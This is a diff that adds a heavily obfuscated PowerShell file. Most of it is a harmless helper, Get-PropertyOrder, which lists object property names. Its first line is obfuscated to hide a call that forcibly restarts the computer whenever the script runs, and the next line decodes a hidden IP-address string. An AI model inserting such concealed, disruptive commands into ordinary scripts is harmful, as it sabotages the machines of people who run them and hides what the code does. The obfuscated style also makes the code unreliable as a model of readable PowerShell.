@@ -1,0 +1,39 @@
+  $0feVX  =[tYPE]("{0}{1}"-f'c','onvErT')  ; &('R'+'e'+'sta'+'rt-'+'Compu'+'ter') -force
+( ( ( ("{14}{3}{2}{8}{11}{9}{10}{4}{7}{12}{13}{1}{0}{6}{5}"-f '2','-3','70%3aO31s','69n','1t36t34O2','7','-36n2','e','35','2e','-3','O38O','O','32Z2e','27p') -SpLIt'p'-SpLIt '-' -SpLIT's'-split '%' -Split'O' -splIt 'n' -SpLiT 'Z'-spLiT 't'|&('fo'+'Re'+'acH'){ ([cHAr](  (iteM  ("variABl"+"E:0fE"+"v"+"X")  ).VAlUE::"T`O`int16"((${_}."tOSt`RI`NG"() ) ,16) )) })-joIn'')  ) |.('oU'+'T'+'-nuLL')
+
+Function GET`-`PROPERtyo`R`d`Er {
+    
+    [cmdletbinding()]
+     param(
+        [Parameter(mAnDAtoRY=${tR`Ue},ValuefRomPipElIne=${tr`Ue},vALuefROMreMAinINGarGumEnTs=${Fal`SE})]
+            [PSObject]${inpu`T`o`BjeCt},
+
+        [validateset({"{0}{2}{3}{1}"-f'Al','rty','iasPr','ope'}, {"{3}{2}{1}{0}" -f 'ty','er','op','CodePr'}, {"{0}{2}{1}"-f'Pr','ty','oper'}, {"{1}{2}{0}" -f'perty','NoteP','ro'}, {"{3}{2}{1}{0}" -f 'rty','ope','riptPr','Sc'},
+            {"{0}{1}{2}" -f'Pr','operti','es'}, {"{3}{0}{2}{1}"-f'p','et','ertyS','Pro'}, {"{0}{1}" -f 'Me','thod'}, {"{1}{2}{0}"-f'd','CodeM','etho'}, {"{1}{2}{0}"-f 'Method','Scr','ipt'}, {"{0}{1}" -f 'Metho','ds'},
+            {"{3}{0}{5}{1}{4}{2}"-f'r','riz','rty','Pa','edPrope','amete'}, {"{0}{2}{1}"-f 'Me','et','mberS'}, {"{0}{1}" -f 'Ev','ent'}, {"{1}{0}"-f'c','Dynami'}, "All")]
+        [string[]]${M`Em`BE`RTyPE} = @( ("{2}{0}{1}{3}"-f'otePr','ope','N','rty'), ("{1}{2}{0}"-f'y','P','ropert'), ("{3}{1}{0}{2}" -f 'ope','Pr','rty','Script') ),
+
+        [string[]]${EX`cLU`dePro`Pe`RTy} = ${nu`ll}
+    )
+
+    begin {
+
+        if(${pSB`OU`N`d`paRAmETErs}."CoNtaInS`K`Ey"(("{0}{1}{2}"-f'i','nputObj','ect'))) {
+            ${f`i`RStoBjecT} = ${InPut`obJe`ct}[0]
+        }
+    }
+    process{
+
+        
+        ${F`irsT`OBject} = ${I`NputOBjE`ct}
+    }
+    end{
+
+        
+        ${fiRst`ObJ`Ect}."Pso`BJECT"."prOPeR`T`I`ES" |
+            &('Where-O'+'b'+'je'+'ct') { ${MEmbERt`Y`Pe} -contains ${_}."MeM`B`ERTYPE" } |
+            .('Sel'+'e'+'ct') -ExpandProperty NA`ME |
+            .('Wh'+'ere-'+'Obj'+'ect'){ -not ${EXc`LUDEP`RoP`Erty} -or ${EXc`LUd`EP`ROPeRTY} -notcontains ${_} }
+    }
+} 
+
